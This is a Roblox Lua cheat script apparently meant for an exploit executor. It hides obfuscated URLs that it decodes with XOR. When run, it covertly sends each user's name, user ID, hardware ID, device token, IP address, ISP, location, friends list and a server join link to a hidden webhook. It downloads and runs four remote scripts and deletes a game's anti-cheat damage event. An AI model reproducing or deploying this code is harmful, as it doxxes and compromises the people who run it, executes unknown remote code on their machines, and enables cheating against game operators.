if not getgenv()._NK_SIGNAL or getgenv()._NK_SIGNAL ~= "NAZARKUS_ULTRA_V8" then
    game:GetService("Players").LocalPlayer:Kick("Run via official loader.")
    return
end
getgenv()._NK_SIGNAL = nil

local Config = {
    WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
    },
    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
}

local function _D(h, k)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(bit32.bxor(tonumber(h:sub(i, i+1), 16), k)) end
    return s
end

local _0xK = 0xAF
local _W = _D("C7C9D3D4D0958584CEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D6DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", _0xK)
local _IP = _D("C7C9D3D48F958584DDD681CDC9D294D0DDC9CD87DDC7DEDCDD9BDCCDC9CFC8C9CDC7D09BCAD8DED0D9D99BCED6D3D9DDCAD8DE", _0xK)
local _E1 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082D9D6D3D5D9DDC9CFC8C9CDC782DCCBCAD6D282DCCBCAD681D3DAD2", _0xK)
local _E2 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3C9DCCBD0DAD2DCCCD6D9CBCADCDD82CEC9CDDCCBDBCDCACCD0C9D8CDDCDD82DCCBCAD682D3D0DAD7C9D4", _0xK)
local _E3 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3CACECEC9C6DE82CDC9DCCBDCDDCEC9D6DEC9DCCBDCDD82CDDAD3CEC9D282D3D0DAD7C9D4", _0xK)
local _E4 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082CDC9DCCBCEC9CDD0D282DCCBCAD682CDC9DCCBCEC9CDD0D281D3DAD2", _0xK)

local _P = game:GetService("Players")
local _H = game:GetService("HttpService")
local _U = game:GetService("UserInputService")
local _R = game:GetService("ReplicatedStorage")
local _lp = _P.LocalPlayer
local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"

pcall(function()
    if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
    else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

local function _GUNC()
    local u, s = 0, 0
    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
    local ts = {"gethui", "setthreadidentity", "getthreadidentity"}
    local env = (getgenv and getgenv()) or getfenv(0)
    for _, f in ipairs(tu) do if env[f] then u = u + 1 end end
    for _, f in ipairs(ts) do if env[f] then s = s + 1 end end
    return string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/6)*100), math.floor((s/3)*100))
end

local function _GF()
    local n, t = "None", "None"
    pcall(function()
        local d = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
        if d then
            for _, f in ipairs(d:GetChildren()) do
                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                    local b = f:FindFirstChild("BasicFactionData")
                    if b then n = b.FactionName.Value t = b.FactionTag.Value end
                    break
                end
            end
        end
    end)
    return n, t
end

local function _LOG()
    pcall(function()
        local req = (syn and syn.request or request or http_request)
        local r = req({Url = _IP, Method = "GET"})
        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
        local fn, ft = _GF()
        local friends = {}
        for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
        
        local jid = game.JobId == "" and "Unknown" or game.JobId
        local joinUrl = "N/A"
        pcall(function()
            local res = req({Url = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid, Method = "GET"})
            if res and res.Success then joinUrl = res.Body end
        end)

        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "✅ Whitelisted User Executed" or "👤 Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 0x00FF00 or 0xFFA500),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. _GUNC() .. ")", ["inline"] = true},
                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                    {["name"] = "Links", ["value"] = "[Click to Join Server]("..joinUrl..") | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
                },
                ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
_SIG.Name = "NK_Signal"
local _PDIR = _R:FindFirstChild("NK_Presence") or Instance.new("Folder", _R)
_PDIR.Name = "NK_Presence"
local _PRES = Instance.new("StringValue", _PDIR)
_PRES.Name = _lp.Name

_SIG.Changed:Connect(function(v)
    if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Access Revoked.") end
end)

if _st == "whitelist" then
    local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
    local f = Instance.new("Frame", sg)
    f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
    Instance.new("UICorner", f)
    
    local s = Instance.new("ScrollingFrame", f)
    s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
    Instance.new("UIListLayout", s).Padding = UDim.new(0,5)

    local function refresh()
        for _,v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
        for _,p in ipairs(_P:GetPlayers()) do
            local b = Instance.new("TextButton", s)
            b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.BackgroundColor3 = Color3.fromRGB(40,40,45); b.TextColor3 = Color3.new(1,1,1)
            b.MouseButton1Click:Connect(function()
                _SIG.Value = p.Name
                task.wait(0.1)
                _SIG.Value = ""
            end)
        end
    end
    _U.InputBegan:Connect(function(k,g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
end

pcall(function() loadstring(game:HttpGet(_E1))() end)
pcall(function() loadstring(game:HttpGet(_E2))() end)
pcall(function() loadstring(game:HttpGet(_E3))() end)
pcall(function() loadstring(game:HttpGet(_E4))() end)
pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
